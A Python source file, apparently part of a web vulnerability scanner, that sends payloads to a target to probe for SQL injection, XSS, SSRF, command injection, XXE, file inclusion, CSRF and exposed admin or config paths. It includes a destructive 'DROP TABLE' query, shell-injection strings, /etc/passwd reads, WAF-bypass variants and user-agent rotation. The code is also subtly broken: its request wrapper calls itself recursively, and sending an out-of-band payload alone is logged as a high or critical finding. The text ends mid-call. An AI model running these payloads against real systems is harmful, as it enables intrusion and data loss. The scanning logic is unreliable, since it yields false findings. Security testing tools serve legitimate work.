"""漏洞扫描模块 — SQL注入 / XSS / SSRF / 命令注入 / Nuclei + WAF 识别"""

import asyncio
import json
import logging
import re
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode

import httpx

from ..core.config import VulnForgeConfig
from ..core.target import Target
from ..utils.waf import WAFDetector
from ..utils.oob import OOBDetector
from ..utils.browser import BrowserAnalyzer


class Finding:
    """漏洞发现对象"""

    def __init__(
        self,
        vuln_type: str,
        url: str,
        param: str = "",
        payload: str = "",
        severity: str = "medium",
        evidence: str = "",
        description: str = "",
    ):
        self.vuln_type = vuln_type
        self.url = url
        self.param = param
        self.payload = payload
        self.severity = severity
        self.evidence = evidence
        self.description = description

    def to_dict(self) -> dict:
        return {
            "vuln_type": self.vuln_type,
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "severity": self.severity,
            "evidence": self.evidence,
            "description": self.description,
        }


class ScannerRunner:
    """漏洞扫描执行器"""

    def __init__(
        self,
        config: VulnForgeConfig,
        target: Target,
        client: Optional[httpx.AsyncClient] = None,
        oob: Optional[OOBDetector] = None,
        enable_browser: bool = False,
    ):
        self.config = config
        self.target = target
        self.client = client
        self.oob = oob
        self.enable_browser = enable_browser
        self.findings: list[Finding] = []
        self._seen: set[tuple[str, str, str, str]] = set()
        self.logger = logging.getLogger(__name__)
        self.recon_results: dict = {}

        # 速率限制 + User-Agent 轮换
        from ..utils.rate import AdaptiveRateLimiter, random_user_agent
        self.rate_limiter = AdaptiveRateLimiter(
            initial_concurrency=config.get("max_concurrent", 5),
        )
        self.rate_limiter_uas = random_user_agent()
        self.rate_limiter_initialized = False

        # 浏览器分析器（可选）
        self.browser = None
        if enable_browser and BrowserAnalyzer.HAS_PLAYWRIGHT:
            try:
                headless = config.get("browser.headless", True)
                self.browser = BrowserAnalyzer(headless=headless)
                self.logger.info("浏览器分析器已初始化")
            except Exception as e:
                self.logger.warning("浏览器分析器初始化失败: %s", e)

    def _add_finding(self, finding: Finding) -> None:
        """添加发现，去重检查"""
        key = (finding.vuln_type, finding.url, finding.param, finding.payload)
        if key in self._seen:
            self.logger.debug(f"  去重跳过: {key}")
            return
        self._seen.add(key)
        self.findings.append(finding)

    async def run(
        self,
        output_dir: Path,
        recon_results: Optional[dict] = None,
        client: Optional[httpx.AsyncClient] = None,
    ) -> dict:
        """执行漏洞扫描

        Args:
            output_dir: 输出目录
            recon_results: 侦察阶段结果字典，包含 'forms' 等字段
            client: 共享 httpx.AsyncClient，优先级高于实例级 client
        """
        # 客户端优先级：方法参数 > __init__参数 > 自建
        effective_client = client or self.client
        if effective_client is None:
            effective_client = httpx.AsyncClient(timeout=30, verify=False)
            self._owns_client = True
        else:
            self._owns_client = False

        self.client = effective_client
        self.recon_results = recon_results or {}

        # 初始化速率限制 + User-Agent
        self.client.headers.update({"User-Agent": self.rate_limiter_uas})
        self.rate_limiter_initialized = True

        # WAF 检测
        self.waf_detector = WAFDetector()
        try:
            detected_waf = await self.waf_detector.detect(
                self.client, self.target.base_url
            )
            if detected_waf:
                self.logger.info("WAF 检测结果: %s", self.waf_detector.get_summary())
                self.waf_name = detected_waf
                self.findings.append(Finding(
                    vuln_type="waf_detected",
                    url=self.target.base_url,
                    severity="info",
                    evidence=f"WAF: {self.waf_detector.get_summary()}",
                    description=f"检测到 Web 应用防火墙: {self.waf_detector.get_summary()}",
                ))
        except Exception as e:
            self.logger.debug("WAF 检测异常: %s", e)
            self.waf_detector = None

        async def _rate_limited_get(url, **kwargs):
            """带速率限制和 UA 轮换的 GET 请求"""
            from ..utils.rate import random_user_agent
            import time
            await self.rate_limiter.wait_if_needed()
            t0 = time.time()
            self.client.headers.update({"User-Agent": random_user_agent()})
            try:
                resp = await self._get(url, **kwargs)
                self.rate_limiter.record_response_time(time.time() - t0)
                return resp
            except Exception:
                raise

        # 替换 self.client.get 为带速率限制的版本
        self._get = _rate_limited_get

        tasks = []

        if self.config.get("scanner.enable_sqli", True):
            tasks.append(self._scan_sqli())
        if self.config.get("scanner.enable_xss", True):
            tasks.append(self._scan_xss())
        if self.config.get("scanner.enable_ssrf", True):
            tasks.append(self._scan_ssrf())
        if self.config.get("scanner.enable_cmd_inject", True):
            tasks.append(self._scan_cmd_injection())
        if self.config.get("scanner.enable_dir_scan", True):
            tasks.append(self._scan_directories())
        if self.oob:
            tasks.append(self._scan_oob())

        if self.config.get("scanner.enable_csrf", True):
            tasks.append(self._scan_csrf())
        if self.config.get("scanner.enable_xxe", True):
            tasks.append(self._scan_xxe())
        if self.config.get("scanner.enable_lfi", True):
            tasks.append(self._scan_lfi())

        if tasks:
            await asyncio.gather(*tasks)

        # Nuclei扫描（额外深度扫描）
        nuclei_findings = await self._run_nuclei_scan()
        if nuclei_findings:
            for f in nuclei_findings:
                self._add_finding(f)

        results = {
            "findings": [f.to_dict() for f in self.findings],
            "total": len(self.findings),
            "severity_counts": {
                "critical": sum(1 for f in self.findings if f.severity == "critical"),
                "high": sum(1 for f in self.findings if f.severity == "high"),
                "medium": sum(1 for f in self.findings if f.severity == "medium"),
                "low": sum(1 for f in self.findings if f.severity == "low"),
                "info": sum(1 for f in self.findings if f.severity == "info"),
            },
        }

        # 保存结果
        output_path = output_dir / "scanner.json"
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2, default=str)

        self.logger.info(f"  [✓] 发现漏洞: {results['total']} 个")
        for sev, cnt in results["severity_counts"].items():
            if cnt > 0:
                self.logger.info(f"       {sev}: {cnt}")

        # 如果我们是自建 client，关闭它
        if getattr(self, "_owns_client", False):
            await self.client.aclose()
            self.client = None

        # 关闭浏览器
        if self.browser:
            try:
                await self.browser.close()
            except Exception:
                pass

        return results

    async def _scan_sqli(self) -> None:
        """SQL注入检测（GET + POST）"""
        payloads = [
            ("'", "单引号错误检测"),
            ("' OR '1'='1", "布尔注入"),
            ("' OR '1'='1' -- ", "注释注入"),
            ("' UNION SELECT NULL-- ", "UNION注入基础"),
            ("' AND SLEEP(3)-- ", "时间盲注"),
            ("1' AND 1=1-- ", "数字型注入"),
            ("1' AND 1=2-- ", "数字型假条件"),
            ('" OR "1"="1', "双引号注入"),
            ("admin'--", "登录绕过"),
            ("1; DROP TABLE users-- ", "堆叠查询"),
        ]

        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLServer JDBC Driver",
            r"com.microsoft.sqlserver",
            r"Driver.*SQL Server",
            r"DB2 SQL error",
            r"\\bODBC\\b",
            r"Invalid query:",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for ODBC Drivers",
        ]

        # --- GET 测试 ---
        for param_name, param_value in self._get_test_params():
            for payload, label in payloads:
                # WAF 绕过变种
                test_items = [(payload, label)]
                if self.waf_detector and self.waf_detector.detected_waf:
                    for variant, desc in self.waf_detector.get_bypass_variants(payload):
                        test_items.append((variant, f"{label}[{desc}]"))
                for payload, label in test_items:
                    try:
                        test_url = self._inject_param(param_name, param_value, payload)
                        resp = await self._get(
                            test_url,
                            follow_redirects=False,
                            timeout=10,
                        )
                        body = resp.text
                        for pattern in error_patterns:
                            if re.search(pattern, body, re.IGNORECASE):
                                self._add_finding(Finding(
                                    vuln_type="sql_injection",
                                    url=test_url,
                                    param=param_name,
                                    payload=payload,
                                    severity="high",
                                    evidence=f"匹配到错误模式: {pattern}",
                                    description=f"SQL注入漏洞 ({label}) — 参数 {param_name} 存在注入风险",
                                ))
                                break
                    except Exception:
                        continue

        # --- GET 时间盲注检测 ---
        for param_name, param_value in self._get_test_params():
            try:
                start = asyncio.get_event_loop().time()
                normal_url = self._inject_param(param_name, param_value, "1")
                await self._get(normal_url, timeout=10)
                normal_time = asyncio.get_event_loop().time() - start

                start = asyncio.get_event_loop().time()
                delay_url = self._inject_param(param_name, param_value, "' AND SLEEP(4)-- ")
                try:
                    await self._get(delay_url, timeout=15)
                    delay_time = asyncio.get_event_loop().time() - start
                    if delay_time > normal_time + 3:
                        self._add_finding(Finding(
                            vuln_type="sql_injection_time_blind",
                            url=delay_url,
                            param=param_name,
                            payload="' AND SLEEP(4)-- ",
                            severity="high",
                            evidence=f"延时: {delay_time:.1f}s (基准: {normal_time:.1f}s)",
                            description=f"时间盲注 — 参数 {param_name} 存在基于时间的SQL注入",
                        ))
                except httpx.TimeoutException:
                    self._add_finding(Finding(
                        vuln_type="sql_injection_time_blind",
                        url=delay_url,
                        param=param_name,
                        payload="' AND SLEEP(4)-- ",
                        severity="high",
                        evidence="请求超时，可能是延时注入生效",
                        description=f"时间盲注 — 参数 {param_name} 触发超时，大概率存在注入",
                    ))
            except Exception:
                continue

        # --- OOB SQLi 测试 ---
        if self.oob:
            oob_payloads = self.oob.get_sqli_oob_payloads()
            for param_name, param_value in self._get_test_params():
                for payload, label in oob_payloads:
                    try:
                        test_url = self._inject_param(param_name, param_value, payload)
                        await self._get(
                            test_url,
                            follow_redirects=False,
                            timeout=10,
                        )
                        self._add_finding(Finding(
                            vuln_type="sql_injection_oob",
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            severity="high",
                            evidence=f"OOB SQLi payload已发送: {label}",
                            description=f"SQL注入 OOB ({label}) — 参数 {param_name}，等待回调验证",
                        ))
                    except Exception:
                        continue

        # --- POST 测试（基于侦察阶段发现的表单）---
        forms = self.recon_results.get("forms", [])
        if not forms:
            self.logger.debug("  [i] 无表单数据，跳过SQLi POST测试")
            return

        for form in forms:
            action_url = form.get("action", self.target.url)
            method = form.get("method", "get").lower()
            input_names = form.get("inputs", [])

            if method != "post":
                continue
            if not input_names:
                continue

            for input_name in input_names:
                for payload, label in payloads:
                    try:
                        resp = await self.client.post(
                            action_url,
                            data={input_name: payload},
                            follow_redirects=False,
                            timeout=10,
                        )
                        body = resp.text
                        for pattern in error_patterns:
                            if re.search(pattern, body, re.IGNORECASE):
                                self._add_finding(Finding(
                                    vuln_type="sql_injection",
                                    url=action_url,
                                    param=input_name,
                                    payload=payload,
                                    severity="high",
                                    evidence=f"POST匹配到错误模式: {pattern}",
                                    description=f"SQL注入漏洞 (POST/{label}) — 表单参数 {input_name} 存在注入风险",
                                ))
                                break
                    except Exception:
                        continue

    async def _scan_xss(self) -> None:
        """XSS检测（GET + POST）"""
        payloads = [
            ("<script>alert(1)</script>", "反射型XSS基础"),
            ("<img src=x onerror=alert(1)>", "img标签XSS"),
            ("<svg onload=alert(1)>", "SVG XSS"),
            ("<body onload=alert(1)>", "body标签XSS"),
            ('"><script>alert(1)</script>', "属性逃逸XSS"),
            ('" onfocus=alert(1) autofocus="', "onfocus XSS"),
            ("javascript:alert(1)", "伪协议XSS"),
            ("<scr<script>ipt>alert(1)</scr<script>ipt>", "嵌套绕过XSS"),
        ]

        # --- GET 测试 ---
        for param_name, param_value in self._get_test_params():
            for payload, label in payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    resp = await self._get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    if payload in body:
                        severity = "medium"
                        evidence = f"Payload未过滤反射: {payload[:50]}"
                        description = f"反射型XSS ({label}) — 参数 {param_name} 未正确过滤"
                        
                        # DOM XSS 浏览器验证
                        if self.browser:
                            try:
                                dom_result = await self.browser.check_dom_xss(test_url, payload)
                                if dom_result.get("dom_xss"):
                                    severity = "high"
                                    evidence += f" | DOM XSS: {dom_result.get('evidence', '')}"
                                    description += " [DOM XSS 确认 — 浏览器端可执行]"
                            except Exception:
                                pass
                        
                        self._add_finding(Finding(
                            vuln_type="xss_reflected",
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            severity=severity,
                            evidence=evidence,
                            description=description,
                        ))
                except Exception:
                    continue

        # --- POST 测试（基于侦察阶段发现的表单）---
        forms = self.recon_results.get("forms", [])
        if not forms:
            self.logger.debug("  [i] 无表单数据，跳过XSS POST测试")
            return

        for form in forms:
            action_url = form.get("action", self.target.url)
            method = form.get("method", "get").lower()
            input_names = form.get("inputs", [])

            if method != "post":
                continue
            if not input_names:
                continue

            for input_name in input_names:
                for payload, label in payloads:
                    try:
                        resp = await self.client.post(
                            action_url,
                            data={input_name: payload},
                            follow_redirects=False,
                            timeout=10,
                        )
                        body = resp.text
                        if payload in body:
                            severity = "medium"
                            evidence = f"POST Payload未过滤反射: {payload[:50]}"
                            description = f"反射型XSS (POST/{label}) — 表单参数 {input_name} 未正确过滤"
                            
                            # DOM XSS 浏览器验证
                            if self.browser:
                                try:
                                    dom_result = await self.browser.check_dom_xss(action_url, payload)
                                    if dom_result.get("dom_xss"):
                                        severity = "high"
                                        evidence += f" | DOM XSS: {dom_result.get('evidence', '')}"
                                        description += " [DOM XSS 确认 — 浏览器端可执行]"
                                except Exception:
                                    pass
                            
                            self._add_finding(Finding(
                                vuln_type="xss_reflected",
                                url=action_url,
                                param=input_name,
                                payload=payload,
                                severity=severity,
                                evidence=evidence,
                                description=description,
                            ))
                    except Exception:
                        continue

    async def _scan_ssrf(self) -> None:
        """SSRF检测"""
        payloads = [
            ("http://127.0.0.1:80", "本地回环"),
            ("http://127.0.0.1:443", "本地HTTPS"),
            ("http://127.0.0.1:22", "SSH端口探测"),
            ("http://127.0.0.1:3306", "MySQL端口探测"),
            ("http://127.0.0.1:6379", "Redis端口探测"),
            ("http://[::1]:80", "IPv6回环"),
            ("http://0.0.0.0:80", "全零地址"),
            ("http://10.0.0.1:80", "内网地址"),
            ("http://172.16.0.1:80", "B类内网"),
            ("http://192.168.1.1:80", "C类内网"),
            ("file:///etc/passwd", "文件协议"),
            ("file:///c:/windows/win.ini", "Windows文件"),
            ("dict://127.0.0.1:6379/info", "dict协议Redis"),
            ("gopher://127.0.0.1:6379/", "gopher协议"),
        ]

        ssrf_indicators = [
            "Connection refused", "Connection timed out",
            "Failed to connect", "couldn't connect to host",
            "Name or service not known", "No route to host",
            "Network is unreachable", " timed out",
        ]

        for param_name, param_value in self._get_test_params():
            param_lower = param_name.lower()
            is_url_param = any(
                kw in param_lower
                for kw in ["url", "uri", "link", "src", "href", "file",
                           "path", "dest", "redirect", "next", "load",
                           "image", "img", "source", "download", "data"]
            )
            if not is_url_param:
                continue

            for payload, label in payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    resp = await self._get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    for indicator in ssrf_indicators:
                        if indicator.lower() in body.lower():
                            self._add_finding(Finding(
                                vuln_type="ssrf",
                                url=test_url,
                                param=param_name,
                                payload=payload,
                                severity="high",
                                evidence=f"响应包含: {indicator}",
                                description=f"SSRF ({label}) — 参数 {param_name} 可能存在SSRF",
                            ))
                            break
                except httpx.ConnectError:
                    pass
                except Exception:
                    continue

        # --- OOB SSRF 测试 ---
        if self.oob:
            oob_payloads = self.oob.get_ssrf_oob_payloads()
            for param_name, param_value in self._get_test_params():
                param_lower = param_name.lower()
                is_url_param = any(
                    kw in param_lower
                    for kw in ["url", "uri", "link", "src", "href", "file",
                               "path", "dest", "redirect", "next", "load",
                               "image", "img", "source", "download", "data"]
                )
                if not is_url_param:
                    continue
                for payload, label in oob_payloads:
                    try:
                        test_url = self._inject_param(param_name, param_value, payload)
                        await self._get(
                            test_url,
                            follow_redirects=False,
                            timeout=10,
                        )
                        self._add_finding(Finding(
                            vuln_type="ssrf_oob",
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            severity="high",
                            evidence=f"OOB SSRF payload已发送: {label}",
                            description=f"SSRF OOB ({label}) — 参数 {param_name}，等待回调验证",
                        ))
                    except Exception:
                        continue

    async def _scan_cmd_injection(self) -> None:
        """命令注入检测"""
        payloads = [
            ("; id", "分号注入"),
            ("| id", "管道符注入"),
            ("|| id", "OR管道"),
            ("& id", "后台符注入"),
            ("&& id", "AND连接"),
            ("`id`", "反引号注入"),
            ("$(id)", "变量替换"),
            ("%0A id", "换行注入"),
            ("; ping -c 3 127.0.0.1", "延时命令"),
            ("| ping -c 3 127.0.0.1", "管道延时"),
        ]

        cmd_success_indicators = [
            "uid=", "gid=", "groups=",
            "root:", "bin:", "daemon:",
        ]

        for param_name, param_value in self._get_test_params():
            for payload, label in payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    resp = await self._get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    for indicator in cmd_success_indicators:
                        if indicator in body:
                            self._add_finding(Finding(
                                vuln_type="command_injection",
                                url=test_url,
                                param=param_name,
                                payload=payload,
                                severity="critical",
                                evidence=f"命令执行成功: {indicator}",
                                description=f"命令注入 ({label}) — 参数 {param_name} 存在命令执行漏洞",
                            ))
                            break
                except Exception:
                    continue

    async def _scan_directories(self) -> None:
        """目录/文件扫描"""
        common_paths = [
            # 通用管理后台
            "/admin", "/admin/", "/login", "/wp-admin", "/wp-login.php",
            "/administrator", "/backend", "/manage", "/management",
            "/dashboard", "/panel", "/cpanel", "/control",
            # 数据库管理
            "/phpmyadmin", "/pma", "/manager", "/adminer",
            "/phppgadmin", "/pgadmin", "/couchdb", "/mongodb",
            "/redis", "/redis-stats",
            # 敏感文件
            "/.git/config", "/.env", "/.htaccess", "/.DS_Store",
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
            "/web.config", "/.gitignore", "/docker-compose.yml",
            "/Dockerfile", "/Makefile", "/package.json",
            "/composer.json", "/Gemfile", "/Gemfile.lock",
            "/yarn.lock", "/pnpm-lock.yaml",
            # 备份文件
            "/backup", "/dump", "/sql", "/db", "/database",
            "/backups", "/data", "/export", "/import",
            "/backup.zip", "/backup.tar.gz", "/dump.sql",
            "/db.sql", "/database.sql", "/db_backup.sql",
            # API
            "/api", "/api/v1", "/api/v2", "/api/v3",
            "/api/swagger", "/api-docs", "/api/health",
            "/api/version", "/api/status", "/api/info",
            "/api/login", "/api/admin", "/api/user", "/api/users",
            "/api/config", "/api/backup", "/api/dump",
            "/api/export", "/api/import",
            # Swagger / OpenAPI
            "/swagger", "/swagger-ui.html", "/swagger-resources",
            "/v2/api-docs", "/v3/api-docs",
            "/api/swagger.json", "/api/swagger.yaml",
            "/openapi.json", "/api/openapi.json",
            "/swagger/index.html", "/api/docs",
            # Spring Actuator
            "/actuator", "/actuator/health", "/actuator/info",
            "/actuator/env", "/actuator/beans",
            "/actuator/configprops", "/actuator/mappings",
            "/actuator/threaddump", "/actuator/heapdump",
            "/actuator/loggers", "/actuator/prometheus",
            "/actuator/metrics", "/actuator/scheduledtasks",
            "/actuator/httptrace", "/actuator/caches",
            "/actuator/conditions", "/actuator/shutdown",
            # GraphQL
            "/graphql", "/graphiql", "/voyager",
            # Java 监控/管理
            "/console", "/h2-console", "/h2",
            "/weblogic", "/console/login/LoginForm.jsp",
            "/jmx-console", "/admin-console",
            "/druid/index.html", "/druid/login.html",
            "/druid/websession.html",
            # 搜索引擎 / 中间件
            "/solr", "/zookeeper",
            "/elasticsearch", "/kibana", "/cerebro",
            # 监控指标
            "/metrics", "/prometheus", "/health", "/info",
            "/env", "/dump", "/trace", "/logfile",
            "/loggers", "/heapdump", "/threads",
            "/heap", "/gc", "/cpu", "/memory",
            "/pool", "/sessions",
            # Hystrix / 断路器
            "/hystrix", "/hystrix.stream", "/turbine.stream",
            # Spring Cloud 配置/刷新
            "/config", "/refresh", "/restart",
            "/pause", "/resume", "/service",
            "/status", "/version", "/build-info",
            # Kubernetes 探针
            "/liveness", "/readiness", "/startup",
        ]

        for path in common_paths:
            try:
                url = self.target.resolve_path(path)
                resp = await self._get(url, follow_redirects=False, timeout=5)

                if resp.status_code in (200, 204, 301, 302, 307, 401, 403):
                    if resp.status_code == 200:
                        severity = "high"
                    elif resp.status_code in (401, 403):
                        severity = "info"
                    else:
                        severity = "medium"

                    self._add_finding(Finding(
                        vuln_type="exposed_path",
                        url=url,
                        param="",
                        payload="",
                        severity=severity,
                        evidence=f"HTTP {resp.status_code} ({len(resp.text)} bytes)",
                        description=f"敏感路径暴露: {path} → {resp.status_code}",
                    ))
            except Exception:
                continue

    async def _scan_csrf(self) -> None:
        """CSRF检测 — 检查POST表单是否缺少CSRF token"""
        forms = self.recon_results.get("forms", [])
        if not forms:
            self.logger.debug("  [i] 无表单数据，跳过CSRF检测")
            return

        csrf_token_names = {
            "csrf_token", "_token", "authenticity_token", "__csrf", "_csrf",
            "csrfmiddlewaretoken", "token", "csrf", "xsrf", "nonce", "_xsrf",
        }

        for form in forms:
            action_url = form.get("action", self.target.url)
            method = form.get("method", "get").lower()
            input_names = form.get("inputs", [])

            if method != "post":
                continue
            if not input_names:
                continue

            # 检查表单是否有CSRF token input
            has_csrf_field = any(
                name.lower() in csrf_token_names
                for name in input_names
            )

            if not has_csrf_field:
                self._add_finding(Finding(
                    vuln_type="csrf_missing",
                    url=action_url,
                    severity="medium",
                    evidence=f"POST表单 {action_url} 缺少CSRF token字段",
                    description=f"POST表单缺少CSRF防护令牌 — 输入字段: {input_names} 中未包含任何常见CSRF token名",
                ))
                self.logger.info(f"  [CSRF] 发现CSRF漏洞: {action_url}")

            # 检查SameSite Cookie属性
            try:
                resp = await self._get(
                    action_url,
                    follow_redirects=False,
                    timeout=10,
                )
                set_cookie = resp.headers.get("set-cookie", "")
                if set_cookie:
                    samesite_match = re.search(
                        r"SameSite\s*=\s*(Strict|Lax|None)",
                        set_cookie,
                        re.IGNORECASE,
                    )
                    if not samesite_match:
                        self._add_finding(Finding(
                            vuln_type="csrf_missing",
                            url=action_url,
                            severity="medium",
                            evidence=f"Cookie缺少SameSite属性: {set_cookie[:80]}",
                            description=f"响应Cookie缺少SameSite属性，可能易受CSRF攻击",
                        ))
                        self.logger.info(f"  [CSRF] 发现Cookie缺少SameSite: {action_url}")
                    elif samesite_match.group(1).lower() == "none":
                        self._add_finding(Finding(
                            vuln_type="csrf_missing",
                            url=action_url,
                            severity="low",
                            evidence=f"SameSite=None: {set_cookie[:80]}",
                            description=f"Cookie SameSite=None 不提供CSRF防护",
                        ))
            except Exception:
                continue

    async def _scan_xxe(self) -> None:
        """XXE (XML外部实体注入) 检测"""
        forms = self.recon_results.get("forms", [])
        target_urls = set()

        # 收集所有POST表单的action URL
        for form in forms:
            method = form.get("method", "get").lower()
            if method == "post":
                action_url = form.get("action", self.target.url)
                target_urls.add(action_url)

        # 如果没有表单，对目标URL本身做测试
        if not target_urls:
            target_urls.add(self.target.url)

        oob_domain = ""
        if self.oob:
            oob_domain = self.oob.domain or "oob.vulnforge.local"

        xxe_payloads = [
            (
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                "Linux /etc/passwd",
                ["root:x:0:0:", "root:x:0:0"],
            ),
            (
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
                "Windows win.ini",
                ["[fonts]", "[Fonts]", "[files]"],
            ),
        ]

        # OOB payload — 只在有oob时添加
        if oob_domain:
            oob_payload = (
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_domain}/xxe">]><root>&xxe;</root>',
                f"OOB ({oob_domain})",
                [],
            )
            xxe_payloads.append(oob_payload)

        for url in target_urls:
            for payload, label, indicators in xxe_payloads:
                try:
                    # 先尝试纯XML content-type
                    resp = await self.client.post(
                        url,
                        content=payload,
                        headers={"Content-Type": "application/xml"},
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    for indicator in indicators:
                        if indicator in body:
                            self._add_finding(Finding(
                                vuln_type="xxe",
                                url=url,
                                payload=payload[:80],
                                severity="critical",
                                evidence=f"响应包含文件内容: {indicator}",
                                description=f"XXE注入 ({label}) — {url} 存在XML外部实体注入漏洞",
                            ))
                            self.logger.info(f"  [XXE] 发现XXE漏洞 ({label}): {url}")
                            break

                    # 也检查OOB (即使没有文件内容回显)
                    if label.startswith("OOB"):
                        self._add_finding(Finding(
                            vuln_type="xxe",
                            url=url,
                            payload=payload[:80],
                            severity="critical",
                            evidence=f"OOB XXE payload已发送至 {oob_domain}",
                            description=f"XXE注入 ({label}) — {url}，等待OOB回调验证",
                        ))
                        self.logger.info(f"  [XXE] 发送OOB XXE payload: {url}")

                    # 再次尝试带charset
                    resp2 = await self.client.post(
                        url,
                        content=payload,
                        headers={"Content-Type": "text/xml; charset=utf-8"},
                        follow_redirects=False,
                        timeout=10,
                    )
                    body2 = resp2.text
                    for indicator in indicators:
                        if indicator in body2 and indicator not in body:
                            self._add_finding(Finding(
                                vuln_type="xxe",
                                url=url,
                                payload=payload[:80],
                                severity="critical",
                                evidence=f"响应包含文件内容: {indicator}",
                                description=f"XXE注入 ({label}) — {url} 存在XML外部实体注入漏洞（text/xml）",
                            ))
                            self.logger.info(f"  [XXE] 发现XXE漏洞 ({label}): {url}")
                            break
                except Exception:
                    continue

    async def _scan_lfi(self) -> None:
        """LFI (本地文件包含 / 路径遍历) 检测"""
        lfi_payloads = [
            ("../../../etc/passwd", "标准Linux"),
            ("..\\..\\..\\windows\\win.ini", "Windows路径"),
            ("....//....//....//etc/passwd", "双点绕过"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "URL编码绕过"),
            ("..;/..;/..;/etc/passwd", "参数污染"),
        ]

        file_content_indicators = [
            "root:x:",            # /etc/passwd 内容
            "[fonts]",            # win.ini 内容
            "[Fonts]",
            "[files]",
            "[Mail]",
            "[Compatibility]",
        ]

        for param_name, param_value in self._get_test_params():
            for payload, label in lfi_payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    resp = await self._get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    body = resp.text
                    status = resp.status_code

                    # 检查是否有文件内容特征
                    found_content = False
                    for indicator in file_content_indicators:
                        if indicator in body:
                            self._add_finding(Finding(
                                vuln_type="lfi",
                                url=test_url,
                                param=param_name,
                                payload=payload,
                                severity="high",
                                evidence=f"响应包含文件内容: {indicator}",
                                description=f"本地文件包含 ({label}) — 参数 {param_name} 存在LFI漏洞，可读取系统文件",
                            ))
                            self.logger.info(f"  [LFI] 发现LFI漏洞 ({label}): {test_url}")
                            found_content = True
                            break

                    if found_content:
                        continue

                    # 非404响应说明路径存在（但不一定有文件内容）
                    if status not in (404,):
                        self._add_finding(Finding(
                            vuln_type="lfi",
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            severity="medium",
                            evidence=f"HTTP {status} (非404，路径可能存在)",
                            description=f"可能的路径遍历 ({label}) — 参数 {param_name} 返回 {status}，路径可能存在",
                        ))
                        self.logger.info(f"  [LFI] 发现可能的路径遍历 ({label}): {test_url} → {status}")

                except Exception:
                    continue

    async def _run_nuclei_scan(self) -> list[Finding]:
        """运行Nuclei深度扫描"""
        try:
            from .nuclei_runner import NucleiRunner

            runner = NucleiRunner(self.config, self.target)
            result = await runner.run(
                output_dir=Path(self.config.output_dir) / f"scan_{int(asyncio.get_event_loop().time())}",
                severity="medium,high,critical",
            )

            findings = []
            for f in result.get("findings", []):
                findings.append(Finding(
                    vuln_type=f.get("vuln_type", "nuclei/unknown"),
                    url=f.get("url", ""),
                    param="",
                    payload="",
                    severity=f.get("severity", "medium"),
                    evidence=f.get("name", "") + " | " + (f.get("description", "") or "")[:100],
                    description=f"Nuclei模板匹配: {f.get('name', 'unknown')}",
                ))

            if result.get("status") == "skipped":
                self.logger.warning(f"  [!] Nuclei跳过: {result.get('message', '')}")

            return findings

        except ImportError:
            self.logger.debug("  [!] nuclei_runner 未安装，跳过Nuclei扫描")
            return []
        except Exception as e:
            self.logger.error(f"  [!] Nuclei扫描异常: {e}")
            return []

    def _get_test_params(self) -> list[tuple[str, str]]:
        """获取待测试的参数列表"""
        params = []

        # 从目标URL中提取参数
        parsed = urlparse(self.target.url)
        query_params = parse_qs(parsed.query)
        for name, values in query_params.items():
            for value in values:
                params.append((name, value))

        # 如果没有参数，添加常见参数名
        if not params:
            common_params = [
                "id", "q", "s", "search", "query", "page", "page_id",
                "user", "username", "name", "email", "pass", "password",
                "url", "redirect", "file", "path", "cmd", "exec",
                "cat", "read", "dir", "show", "view", "load",
                "img", "image", "src", "href", "data",
                "action", "func", "method", "do",
            ]
            for param in common_params:
                params.append((param, "1"))

        return params

    def _inject_param(self, param_name: str, original: str, payload: str) -> str:
        """在指定参数中注入payload"""
        parsed = urlparse(self.target.url)
        query_params = parse_qs(parsed.query)

        if query_params:
            # 替换已有参数
            query_params[param_name] = [payload]
            new_query = urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            # 添加新参数
            sep = "&" if "?" in self.target.url else "?"
            return f"{self.target.url}{sep}{param_name}={payload}"

    async def _scan_oob(self) -> None:
        """OOB 命令注入检测 — 使用 OOB payload 测试所有参数"""
        if not self.oob:
            return
        oob_payloads = self.oob.get_cmd_oob_payloads()
        if not oob_payloads:
            return
        for param_name, param_value in self._get_test_params():
            for payload, label in oob_payloads:
                try:
                    test_url = self._inject_param(param_name, param_value, payload)
                    await self._get(
                        test_url,
                        follow_redirects=False,
                        timeout=10,
                    )
                    self._add_finding(Finding(
                        vuln_type="command_injection_oob",
                        url=test_url,
                        param=param_name,
                        payload=payload,
                        severity="critical",
                        evidence=f"OOB CMD payload已发送: {label}",
                        description=f"命令注入 OOB ({label}) — 参数 {param_name}，等待回调验证",
